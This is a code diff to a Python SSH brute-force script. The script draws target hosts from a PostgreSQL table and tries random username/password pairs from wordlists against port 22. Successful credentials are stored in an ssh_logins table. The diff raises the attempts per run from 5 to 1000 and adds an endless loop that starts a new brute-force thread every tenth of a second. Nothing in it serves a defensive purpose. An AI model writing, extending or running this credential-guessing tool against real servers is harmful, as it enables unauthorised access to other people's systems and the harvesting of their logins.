@@ -9,6 +9,7 @@ import os
 import json
 import random
 from dotenv import load_dotenv
+import threading
 
 GREEN = '\033[32m'
 RED = '\033[31m'
@@ -25,7 +26,7 @@ conn = psycopg2.connect(
     password=os.getenv('DB_PASSWORD')
 )
 
-async def ssh_login(username_file, password_file):
+def ssh_login(username_file, password_file):
     with open(username_file, 'r', encoding='utf-8', errors='ignore') as file:
         usernames = file.read().splitlines()
 
@@ -46,16 +47,12 @@ async def ssh_login(username_file, password_file):
     # Get the hostname and IP address from the selected row
     hostname, ip_address = row
 
-    # Try to SSH login 5 times using random values from the username and password files
-    for i in range(5):
+    for i in range(1000):
         username = random.choice(usernames)
         password = random.choice(passwords)
         try:
             print(f"{GREEN}Trying {RESET}{username}/{password} {GREEN}as credentials on {RESET}{ip_address}")
-            await asyncio.get_event_loop().run_in_executor(
-                None,
-                lambda: client.connect(str(ip_address), port=22, username=username, password=password, timeout=15),
-            )
+            client.connect(str(ip_address), port=22, username=username, password=password, timeout=15)
             print(f"{GREEN}Successful login on {RESET}{ip_address}{GREEN} with credentials: {RESET}{username}/{password}")
 
             cur.execute("INSERT INTO ssh_logins (hostname, ip_address, username, password) VALUES (%s, %s, %s, %s)", (hostname, ip_address, username, password))
@@ -74,6 +71,19 @@ async def ssh_login(username_file, password_file):
             print(f"{RED}Unable to connect to port 22 on {RESET}{ip_address}")
             print(f"{RED}Error: {RESET}{str(e)}")
             break
+
+def run_ssh_login(username_file, password_file):
+    thread = threading.Thread(target=ssh_login, args=(username_file, password_file))
+    thread.start()
+
+async def main():
+    while True:
+        run_ssh_login('usernames.txt', 'passwords.txt')
+        await asyncio.sleep(0.1)
+
+if __name__ == '__main__':
+    asyncio.run(main())
+
 
 
 
